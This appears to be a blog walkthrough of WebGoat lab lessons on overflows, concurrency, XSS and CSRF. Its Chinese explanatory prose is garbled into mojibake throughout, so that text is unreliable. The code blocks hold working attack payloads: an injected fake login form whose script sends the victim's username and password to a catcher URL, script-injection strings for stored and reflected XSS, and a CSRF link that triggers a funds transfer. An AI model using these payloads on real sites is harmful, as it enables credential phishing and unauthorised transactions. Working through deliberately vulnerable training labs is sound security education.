<p>Â∞ΩÁÆ°Êõ¥‰∏∫Â∞ëËßÅÔºå‰ΩÜÂΩìÂ∫îÁî®Á®ãÂ∫èÁöÑ‰∏ÄÂ±ÇÂàÜÈÖçÁöÑÂÜÖÂ≠ò‰∏çË∂≥‰ª•Â§ÑÁêÜÁî®Êà∑Êèê‰∫§ÁöÑÊï∞ÊçÆÊó∂ÔºåWeb ‰∏äÁöÑÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û‰ºöÂèëÁîü„ÄÇ ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåËøôÊ†∑ÁöÑ‰∏Ä‰∏™Â±ÇÊ¨°ÂèØ‰ª•Áî® C ËØ≠Ë®ÄÊàñÁ±ª‰ººÁöÑËØ≠Ë®ÄÁºñÂÜô„ÄÇ ÂØπ‰∫éÁâπÂÆöÁöÑÂ≠êÈõÜÔºåÂç≥ÈÄê‰∏™Ê∫¢Âá∫ÔºåÊú¨ËØæÈáçÁÇπ‰ªãÁªçËÉΩÂ§üË¶ÜÁõñÂ∞æÈöèÁ©∫Â≠óËäÇ‰ΩçÁΩÆÁöÑÂêéÊûú„ÄÇ Âõ†Ê≠§ÔºåÁî±‰∫éÊ≤°ÊúâÊâæÂà∞Á©∫Â≠óËäÇÁöÑ‰∫ãÂÆûÔºåËøõ‰∏ÄÊ≠•ÁöÑ‰ø°ÊÅØË¢´ËøîÂõûÁªôÁî®Êà∑„ÄÇ<br />
ËØæÁ®ãÁõÆÊ†áÔºö</p>
<p>Ê¨¢ËøéÊù•Âà∞ OWASP ÈÖíÂ∫óÔºÅ ‰Ω†ËÉΩÊâæÂá∫Ë¥µÂÆæ‰ΩèÂú®Âì™‰∏™ÊàøÈó¥ÂêóÔºü</p>
<p>‰∫ÜËß£Â¶Ç‰ΩïÂú® Web Â∫îÁî®Á®ãÂ∫è‰∏äËß¶ÂèëÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û„ÄÇ<br />
*‰∫ÜËß£‰ªÄ‰πàÁ±ªÂûãÁöÑÂÄºÈïøÂ∫¶ÂèØËÉΩ‰ºöÂºïÂèëÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇ</p>
<p>Â°´ÂÜôÁî®Êà∑ÂêçÔºåroom„ÄÇÁÑ∂ÂêéËøõÂÖ•Âà∞‰∏Ä‰∏™ÁΩëÈ°µÔºåÁÇπÂáª Accept Term ÁöÑÊó∂ÂÄôÊäìÂåÖ„ÄÇÊ∫¢Âá∫ <code>room_no</code> Âç≥ÂèØÔºåÂ°´ÁöÑÊï∞Â≠óÂ§ß‰∏ÄÁÇπ„ÄÇÊü•ÁúãÊ∫êÁ†ÅÔºåËã•ËøîÂõûÁöÑÊúâ type='hiden'ÁöÑ&lt;input,</p>
<p>ÈÇ£‰πàËØ¥ÊòéÊ∫¢Âá∫ÊàêÂäü„ÄÇÁÑ∂ÂêéÂÜçÈöè‰æøÈÄâ‰∏Ä‰∏™ vip ÁöÑËµÑÊñôÔºåÊåâ‰πãÂâçÁöÑÊ≠•È™§ÂÜçÂÅö‰∏ÄÈÅçÔºåÂà∞ Accept Term ÈÇ£‰∏™ÁΩëÈ°µÁöÑÊó∂ÂÄôÁ≥ªÁªü‰ºöÂëäËØâ‰Ω†ÔºåËøáÂÖ≥‰∫Ü</p>
<h2 id="code-quality">Code Quality</h2>
<h3 id="discover-clues-in-the-html">Discover Clues in the HTML</h3>
<p>ÂºÄÂèë‰∫∫ÂëòÂõ†Âú®Ê∫ê‰ª£Á†Å‰∏≠Áïô‰∏ãËØ∏Â¶Ç FIXMEÔºåTODOÔºåCode BrokenÔºåHack Á≠âÁ≠âÁöÑÂ£∞ÊòéËÄåËá≠ÂêçÊò≠ÁùÄ„ÄÇ Êü•ÁúãÊ∫ê‰ª£Á†Å‰ª•Ëé∑Âèñ‰ªª‰ΩïË°®Á§∫ÂØÜÁ†ÅÔºåÂêéÈó®ÊàñÊ≥®ÈáäÁöÑÊ≥®ÈáäÈÉΩÊó†Ê≥ïÊ≠£Â∏∏Â∑•‰Ωú„ÄÇ ‰ª•‰∏ãÊòØÂü∫‰∫éË°®ÂçïÁöÑË∫´‰ªΩÈ™åËØÅË°®ÂçïÁöÑÁ§∫‰æã„ÄÇ ÂØªÊâæÂ∏ÆÂä©ÊÇ®ÁôªÂΩïÁöÑÁ∫øÁ¥¢„ÄÇ</p>
<p>Êó¢ÁÑ∂ÊòØÊ≥®ÈáäÁöÑÈîÖÔºåÈÇ£Â∞±ÁúãÊ∫êÁ†ÅÂíØÔºöÂèëÁé∞ <code>&lt;!-- FIXME admin:adminpw  --&gt;</code></p>
<h2 id="concurrency">Concurrency</h2>
<h3 id="thread-safety-problems">Thread Safety Problems</h3>
<p>Áî®Êà∑Â∫îËØ•ËÉΩÂ§üÂà©Áî®Ê≠§ Web Â∫îÁî®Á®ãÂ∫è‰∏≠ÁöÑÂπ∂ÂèëÈîôËØØÂπ∂Êü•ÁúãÂè¶‰∏Ä‰∏™ÂêåÊó∂Â∞ùËØïÁõ∏ÂêåÂäüËÉΩÁöÑÁî®Êà∑ÁöÑÁôªÂΩï‰ø°ÊÅØ„ÄÇ ËøôÂ∞ÜÈúÄË¶Å‰ΩøÁî®‰∏§‰∏™ÊµèËßàÂô®„ÄÇ ÊúâÊïàÁöÑÁî®Êà∑ÂêçÊòØ'jeff'Âíå'dave'„ÄÇ<br />
ËØ∑ËæìÂÖ•ÊÇ®ÁöÑÁî®Êà∑Âêç‰ª•ËÆøÈóÆÊÇ®ÁöÑÂ∏êÊà∑„ÄÇ</p>
<p>Web Â∫îÁî®Á®ãÂ∫èÂèØ‰ª•ÂêåÊó∂Â§ÑÁêÜÂ§ö‰∏™ HTTP ËØ∑Ê±Ç„ÄÇ ÂºÄÂèë‰∫∫ÂëòÁªèÂ∏∏‰ΩøÁî®‰∏çÊòØÁ∫øÁ®ãÂÆâÂÖ®ÁöÑÂèòÈáè„ÄÇ Á∫øÁ®ãÂÆâÂÖ®ÊÑèÂë≥ÁùÄÂØπË±°ÊàñÁ±ªÁöÑÂ≠óÊÆµÂú®Áî±Â§ö‰∏™Á∫øÁ®ãÂêåÊó∂‰ΩøÁî®Êó∂ÂßãÁªà‰øùÊåÅÊúâÊïàÁä∂ÔºåÊÄÅ„ÄÇ ÈÄöÂ∏∏ÂèØ‰ª•ÈÄöËøáÂú®Âêå‰∏ÄÊó∂Èó¥Âä†ËΩΩ‰∏éÂè¶‰∏Ä‰∏™Áî®Êà∑Áõ∏ÂêåÁöÑÈ°µÈù¢Êù•Âà©Áî®Âπ∂ÂèëÈîôËØØ„ÄÇ<br />
Áî±‰∫éÊâÄÊúâÁ∫øÁ®ãÂÖ±‰∫´Áõ∏ÂêåÁöÑÊñπÊ≥ïÂå∫ÂüüÔºåÂπ∂‰∏îÊñπÊ≥ïÂå∫ÂüüÊòØÊâÄÊúâÁ±ªÂèòÈáèÁöÑÂ≠òÂÇ®‰ΩçÁΩÆÔºåÂõ†Ê≠§Â§ö‰∏™Á∫øÁ®ãÂèØ‰ª•Â∞ùËØïÂêåÊó∂‰ΩøÁî®Áõ∏ÂêåÁöÑÁ±ªÂèòÈáè„ÄÇ</p>
<p>ÊâìÂºÄ 2 ‰∏™ÊµèËßàÂô®Ê®°Êãü 2 ‰∏™Áî®Êà∑Ôºå‰∏Ä‰∏™ËæìÂÖ• <code>dave</code>Ôºå‰∏Ä‰∏™ËæìÂÖ• <code>jeff</code></p>
<p>Êñ∞Âª∫Ê†áÁ≠æÈ°µ‰πüË°å</p>
<h3 id="shopping-cart-concurrency-flaw">Shopping Cart Concurrency Flaw</h3>
<p>Âêå‰∏äÔºå‰∏Ä‰∏™ÂÖàÊääË¥µÁöÑÁâ©ÂìÅÊîæÂÖ•Ë¥≠Áâ©ËΩ¶ÔºåÁÑ∂ÂêéÁÇπ purchaseÔºõÂè¶‰∏Ä‰∏™ÂÜçÊää‰æøÂÆúÁöÑÁâ©ÂìÅÊîæÂÖ•Ë¥≠Áâ©ËΩ¶ÔºåÁÇπ update cartÔºåÁÑ∂ÂêéÁ¨¨‰∏Ä‰∏™Â∞±ÂèØ‰ª•Á°ÆËÆ§Ë¥≠‰π∞‰∫ÜÔºà‰ª•Á¨¨‰∫å‰∏™ÁöÑ‰ª∑Ê†º</p>
<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
<h3 id="phishing-with-xss">Phishing with XSS</h3>
<p>ËøôÈ¢òÊúâÊØí„ÄÇ„ÄÇÊòéÊòéÁî®ÁöÑÊòØ POSTÔºåÈöæÈÅì‰∏çÊòØËøôÊ†∑ÁöÑ‰πàÔºö</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot; http://localhost:8080/WebGoat/catcher?PROPERTY=yes&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;Post&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>Áúã‰∫ÜÁ≠îÊ°àÊâçÁü•ÈÅìÊòØ get Âûã„ÄÇ„ÄÇÂ•ΩÂêßÔºåÁî® Get Â∞±Áî® get ÂêßÔºö</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params"></span>)&#123; </span><br><span class="language-javascript"><span class="hljs-title class_">XSSImage</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>; <span class="hljs-title class_">XSSImage</span>.<span class="hljs-property">src</span>=<span class="hljs-string">&quot;http://localhost/WebGoat/catcher Ôºü PROPERTY=yes&amp;user=&quot;</span>+ <span class="hljs-variable language_">document</span>.<span class="hljs-property">phish</span>.<span class="hljs-property">user</span>.<span class="hljs-property">value</span> + <span class="hljs-string">&quot;&amp;password=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">phish</span>.<span class="hljs-property">pass</span>.<span class="hljs-property">value</span>;&#125; </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phish&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">H3</span>&gt;</span><br>This feature requires account login:&lt;/H3 &gt;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Enter Username:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Enter Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;pass&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;hack()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HR</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>ÂÖ∂ÂÆûËøôÊ†∑‰πüÂèØ‰ª•Ôºå‰∏çËøáÈ¢òÁõÆÊåáÂÆöË¶ÅÁî® jsÔºö</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot; http://localhost:8080/WebGoat/catcher?PROPERTY=yes&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="stored-xss-attacks">Stored XSS Attacks</h3>
<p>Ê∏ÖÁêÜÊâÄÊúâËæìÂÖ•ÔºåÂ∞§ÂÖ∂ÊòØÁ®çÂêéÂ∞ÜÁî®‰Ωú OS ÂëΩ‰ª§ÔºåËÑöÊú¨ÂíåÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÁöÑÂèÇÊï∞ÁöÑËæìÂÖ•ÊÄªÊòØ‰∏Ä‰∏™Â•Ω‰π†ÊÉØ„ÄÇ ÂØπ‰∫éÊ∞∏‰πÖÂ≠òÂÇ®Âú®Â∫îÁî®Á®ãÂ∫èÊüêÂ§ÑÁöÑÂÜÖÂÆπËÄåË®ÄÔºåËøô‰∏ÄÁÇπÂ∞§ÂÖ∂ÈáçË¶Å„ÄÇ Áî®Êà∑‰∏çÂ∫îËØ•ËÉΩÂ§üÂàõÂª∫ÂèØËÉΩÂØºËá¥ÂÖ∂‰ªñÁî®Êà∑Âú®Ê£ÄÁ¥¢Âà∞Áî®Êà∑Ê∂àÊÅØÊó∂Âä†ËΩΩ‰∏çÈúÄË¶ÅÁöÑÈ°µÈù¢Êàñ‰∏çÈúÄË¶ÅÁöÑÂÜÖÂÆπÁöÑÊ∂àÊÅØÂÜÖÂÆπ„ÄÇ</p>
<p>Âú® Message ÈáåÂÜôÂÖ• <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ÔºåÁÑ∂ÂêéÁÇπÂáªËøô‰∏™ÈìæÊé•Âç≥ÂèØ</p>
<h3 id="lab-cross-site-scripting">LAB: Cross Site Scripting</h3>
<h4 id="stage-1-4">Stage 1</h4>
<p>Èò∂ÊÆµ 1ÔºöÊâßË°åÂ≠òÂÇ®ÁöÑË∑®Á´ôÁÇπËÑöÊú¨ÔºàXSSÔºâÊîªÂáª„ÄÇ<br />
‰Ωú‰∏∫‚ÄúÊ±§ÂßÜ‚ÄùÔºåÂú®ÁºñËæëÈÖçÁΩÆÊñá‰ª∂È°µÈù¢‰∏äÂØπ Street Â≠óÊÆµÊâßË°åÂ≠òÂÇ®ÁöÑ XSS ÊîªÂáª„ÄÇ Á°ÆËÆ§'Jerry'ÂèóÂà∞ÊîªÂáªÁöÑÂΩ±Âìç„ÄÇ<br />
Â∏êÊà∑ÁöÑÂØÜÁ†ÅÊòØÂÖ∂ÁªôÂÆöÂêçÁß∞ÁöÑÂ∞èÂÜôÁâàÊú¨Ôºà‰æãÂ¶ÇÔºåTom Cat ÁöÑÂØÜÁ†ÅÊòØ‚Äútom‚ÄùÔºâ„ÄÇ</p>
<p>Âú® Street ÈáåÂ°´ÂÖ• <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ÔºåÊõ¥Êñ∞ÈÖçÁΩÆ„ÄÇÁÑ∂ÂêéÁî® Jerry ÁöÑË¥¶Êà∑ÁôªÈôÜÂêéÔºåÊü•Áúã Tom ÁöÑÊ°£Ê°àÔºåËøôÊó∂ÂÄôÂ∞±‰ºöÂºïÂèëÂºπÁ™ó</p>
<h4 id="stage-2-4">Stage 2</h4>
<p>Èò∂ÊÆµ 2Ôºö‰ΩøÁî®ËæìÂÖ•È™åËØÅÂùóÂ≠òÂÇ® XSS„ÄÇ</p>
<p>Êú¨ËØæÁ®ã‰ªÖÈÄÇÁî®‰∫é WEBGOAT ÁöÑÂºÄÂèëËÄÖÁâàÊú¨</p>
<p>Âú®ÂÜôÂÖ•Êï∞ÊçÆÂ∫ì‰πãÂâçÔºåÂÆûÊñΩ‰øÆÂ§ç‰ª•ÈòªÊ≠¢Â≠òÂÇ®ÁöÑ XSS„ÄÇ ÈáçÂ§çÁ¨¨‰∏ÄÈò∂ÊÆµÔºå'Â§ßÂç´'‰Ωú‰∏∫'ÂüÉÈáåÂÖã'‰Ωú‰∏∫ÁªèÁêÜ„ÄÇ Á°ÆËÆ§'David'‰∏çÂèóÊ≠§ÊîªÂáªÁöÑÂΩ±Âìç„ÄÇ</p>
<p>‰øÆÂ§çÂÜÖÂÆπ„ÄÇÂÅöÂ•ΩËøáÊª§Âç≥ÂèØ</p>
<h4 id="stage-3-2">Stage 3</h4>
<p>Èò∂ÊÆµ 3ÔºöÊâßË°åÂÖàÂâçÂ≠òÂÇ®ÁöÑË∑®Á´ôÁÇπËÑöÊú¨ÔºàXSSÔºâÊîªÂáª„ÄÇ<br />
'Â∏ÉÈ≤ÅÊñØ'ÂëòÂ∑•Ê°£Ê°àÈ¢ÑÂÖàÂä†ËΩΩ‰∫ÜÂ≠òÂÇ®ÁöÑ XSS ÊîªÂáª„ÄÇ Âç≥‰ΩøÁ¨¨ 2 Èò∂ÊÆµÁöÑ‰øÆÂ§çÂ∑≤Âà∞‰ΩçÔºå‰πüË¶ÅÁ°ÆËÆ§'David'ÂèóÂà∞ÊîªÂáªÁöÑÂΩ±Âìç„ÄÇ</p>
<p>È™åËØÅ Bruce ÁöÑ‰∏™‰∫∫ÁÆÄ‰ªã‰∏≠ÂåÖÂê´Êúâ XSS ÊîªÂáªÔºå‰ΩøÁî® David Áî®Êà∑ÔºàÂØÜÁ†ÅÔºödavidÔºâÁôªÂΩïÔºåÊü•Áúã Bruce ÁöÑ‰∏™‰∫∫ÁÆÄ‰ªãÔºåÂá∫Áé∞ÂºπÁ™óÔºåË°®ÊòéÂ≠òÂú® XSS ÊîªÂáª„ÄÇ</p>
<h4 id="stage-4-2">Stage 4</h4>
<p>Èò∂ÊÆµ 4Ôºö‰ΩøÁî®ËæìÂá∫ÁºñÁ†ÅÂùóÂ≠òÂÇ® XSS„ÄÇ</p>
<p>Êú¨ËØæÁ®ã‰ªÖÈÄÇÁî®‰∫é WEBGOAT ÁöÑÂºÄÂèëËÄÖÁâàÊú¨</p>
<p>‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ËØªÂèñÊï∞ÊçÆÂêéÔºåÂÆûÊñΩ‰øÆÂ§ç‰ª•ÈòªÊ≠¢ XSS„ÄÇ ÈáçÂ§çÁ¨¨ 3 Èò∂ÊÆµ„ÄÇÁ°ÆËÆ§'Â§ßÂç´'‰∏çÂèóÂ∏ÉÈ≤ÅÊñØÈÖçÁΩÆÊñá‰ª∂ÊîªÂáªÁöÑÂΩ±Âìç„ÄÇ</p>
<p>ÂêåÊ†∑ÔºåÂØπÂú®Êï∞ÊçÆÂ∫ìÈáåÁöÑÂÜÖÂÆπÔºåËæìÂá∫ÁöÑÊó∂ÂÄô‰πüÂæóËøáÊª§</p>
<h4 id="stage-5-1">Stage 5</h4>
<p>Á¨¨ 5 Èò∂ÊÆµ<br />
Èò∂ÊÆµ 5ÔºöÊâßË°åÂèçÂ∞Ñ XSS ÊîªÂáª„ÄÇ<br />
‰ΩøÁî®ÊêúÁ¥¢Â∑•‰Ωú‰∫∫ÂëòÈ°µÈù¢‰∏äÁöÑÊºèÊ¥ûÊù•Âà∂‰ΩúÂåÖÂê´ÂèçÊò†ÁöÑ XSS ÊîªÂáªÁöÑ URL„ÄÇ È™åËØÅ‰ΩøÁî®ËØ•ÈìæÊé•ÁöÑÂÖ∂‰ªñÂëòÂ∑•ÊòØÂê¶ÂèóÂà∞Ê≠§ÊîªÂáªÁöÑÂΩ±Âìç„ÄÇ</p>
<p>ÁôªÈôÜ‰∏Ä‰∏™‰∫∫ÁöÑË¥¶Êà∑ÔºåÂú®ÊêúÁ¥¢Ê°ÜÈáåËæìÂÖ• <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h4 id="stage-6">Stage 6</h4>
<p>Èò∂ÊÆµ 6Ôºö‰ΩøÁî®ËæìÂÖ•È™åËØÅÂùóÂèçÂ∞Ñ XSS„ÄÇ</p>
<p>Êú¨ËØæÁ®ã‰ªÖÈÄÇÁî®‰∫é WEBGOAT ÁöÑÂºÄÂèëËÄÖÁâàÊú¨</p>
<p>ÂÆûÊñΩ‰øÆÂ§çÊé™ÊñΩ‰ª•ÈòªÊ≠¢ËøôÁßçÂèçÊò†ÁöÑ XSS ÊîªÂáª„ÄÇ ÈáçÂ§çÊ≠•È™§ 5.Á°ÆËÆ§ÊîªÂáª URL ‰∏çÂÜçÊúâÊïà„ÄÇ</p>
<p>ÂêåÊ†∑ÂÅöÂ•ΩËøáÊª§Âç≥ÂèØ</p>
<h3 id="reflected-xss-attacks">Reflected XSS Attacks</h3>
<p>È™åËØÅÊúçÂä°Âô®Á´ØÁöÑÊâÄÊúâËæìÂÖ•ÊÄªÊòØ‰∏Ä‰∏™Â•Ω‰π†ÊÉØ„ÄÇ Âú® HTTP ÂìçÂ∫î‰∏≠‰ΩøÁî®Êú™ÁªèÈ™åËØÅÁöÑÁî®Êà∑ËæìÂÖ•Êó∂ÔºåÂèØËÉΩ‰ºöÂèëÁîü XSS„ÄÇ Âú®ÂèçÊò†ÁöÑ XSS ÊîªÂáª‰∏≠ÔºåÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®ÊîªÂáªËÑöÊú¨Âà∂‰Ωú‰∏Ä‰∏™ URL Âπ∂Â∞ÜÂÖ∂ÂèëÂ∏ÉÂà∞Âè¶‰∏Ä‰∏™ÁΩëÁ´ôÔºåÂèëÈÄÅÁîµÂ≠êÈÇÆ‰ª∂Êàñ‰ª•ÂÖ∂‰ªñÊñπÂºèËÆ©ÂèóÂÆ≥ËÄÖÁÇπÂáªÂÆÉ„ÄÇ</p>
<p>Âú® <code>access code</code> ‰∏≠ËæìÂÖ• <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> Âç≥ÂèØ</p>
<h3 id="cross-site-request-forgery-csrf">Cross Site Request Forgery (CSRF)</h3>
<p>ÊÇ®ÁöÑÁõÆÊ†áÊòØÂèëÈÄÅÁîµÂ≠êÈÇÆ‰ª∂Âà∞Êñ∞ÈóªÁªÑ„ÄÇ ËØ•ÁîµÂ≠êÈÇÆ‰ª∂ÂåÖÂê´‰∏Ä‰∏™ÂõæÂÉèÔºåÂÖ∂ URL ÊåáÂêëÊÅ∂ÊÑèËØ∑Ê±Ç„ÄÇ Âú®Êú¨ËØæ‰∏≠ÔºåURL Â∫îÊåáÂêëÂ∏¶ÊúâËØæÁ®ã‚ÄúScreen‚ÄùÂíå‚Äúmenu‚ÄùÂèÇÊï∞ÁöÑ‚Äúattack‚ÄùservletÔºå‰ª•ÂèäÂÖ∑Êúâ‰ªªÊÑèÊï∞ÂÄºÔºàÂ¶Ç 5000ÔºâÁöÑÈ¢ùÂ§ñÂèÇÊï∞‚ÄútransferFunds‚Äù„ÄÇÊÇ®ÂèØ‰ª•ÈÄöËøáÊü•Êâæ‚ÄúScreen ‚ÄúÂíå‚Äùmenu‚ÄúÂÄºÂú®Âè≥ËæπÁöÑÂèÇÊï∞ÊèíÂÖ•‰∏≠„ÄÇ ÂΩìÊó∂ÂèëÁîüËÆ§ËØÅÁöÑ CSRF ÁîµÂ≠êÈÇÆ‰ª∂ÁöÑÊî∂‰ª∂‰∫∫Â∞ÜËΩ¨ÁßªÂÖ∂ËµÑÈáë„ÄÇ ÂΩìÊú¨ËØæÁöÑÊîªÂáªÊàêÂäüÊó∂ÔºåÂ∑¶ËæπËèúÂçï‰∏≠ÁöÑËØæÁ®ãÂêçÁß∞ÊóÅ‰ºöÂá∫Áé∞ÁªøËâ≤Â§çÈÄâÊ†áËÆ∞„ÄÇ</p>
<p>Âú® Message ÈáåËæìÂÖ•</p>
<p><code>http://localhost:8080/WebGoat/attack?Screen=2078372&amp;menu=900&amp;transferFunds=5000</code></p>
<p>Êèê‰∫§Âç≥ÂèØ</p>
<h3 id="csrf-prompt-by-pass">CSRF Prompt By-Pass</h3>
<p>‰∏é CSRF ËØæÁ®ãÁ±ª‰ººÔºåÊÇ®ÁöÑÁõÆÊ†áÊòØÂêëÂåÖÂê´Â§ö‰∏™ÊÅ∂ÊÑèËØ∑Ê±ÇÁöÑÊñ∞ÈóªÁªÑÂèëÈÄÅÁîµÂ≠êÈÇÆ‰ª∂ÔºöÁ¨¨‰∏Ä‰∏™‰º†ËæìËµÑÈáëÔºåÁ¨¨‰∫å‰∏™ËØ∑Ê±ÇÁ°ÆËÆ§Á¨¨‰∏Ä‰∏™ËØ∑Ê±ÇËß¶ÂèëÁöÑÊèêÁ§∫„ÄÇ Ëøô‰∫õ URL Â∫îÈÄöËøáÊ≠§ CSRF-by-pass ËØæÁ®ãÁöÑÂ±èÂπïÔºåËèúÂçïÂèÇÊï∞‰ª•ÂèäÂÖ∑ÊúâËØ∏Â¶Ç‚Äú5000‚Äù‰πãÁ±ªÁöÑÊï∞ÂÄºÁöÑÈ¢ùÂ§ñÂèÇÊï∞‚ÄútransferFunds‚ÄùÊù•ÊåáÂêëÊîªÂáª servlet ‰ª•ÂêØÂä®‰º†ËæìÂπ∂‰∏îÂ≠óÁ¨¶‰∏≤ÂÄº‚ÄúCONFIRM‚Äù ÂÆåÊàêÂÆÉ„ÄÇ ÊÇ®ÂèØ‰ª•‰ªéÂè≥‰æßÁöÑÊèíÂõæÂ§çÂà∂ËØæÁ®ãÂèÇÊï∞‰ª•ÂàõÂª∫Ê†ºÂºè‰∏∫</p>
<p><code>attack?Screen=XXX&amp;menu=YYY&amp;transferFunds=ZZZ</code></p>
<p>ÁöÑÁΩëÂùÄ„ÄÇ Êó†ËÆ∫Ë∞ÅÊî∂Âà∞ËøôÂ∞ÅÁîµÂ≠êÈÇÆ‰ª∂Âπ∂ÊÅ∞Â•ΩÂú®ÈÇ£‰∏™Êó∂ÂÄôËøõË°åËÆ§ËØÅÔºå‰ªñÁöÑËµÑÈáëÈÉΩÂ∞ÜË¢´ËΩ¨Áßª„ÄÇ ÂΩìÊÇ®ËÆ§‰∏∫ÊîªÂáªÊàêÂäüÊó∂ÔºåÂà∑Êñ∞È°µÈù¢ÔºåÊÇ®‰ºöÂú®Â∑¶‰æßËèúÂçï‰∏≠ÊâæÂà∞ÁªøËâ≤Ê£ÄÊü•„ÄÇ</p>
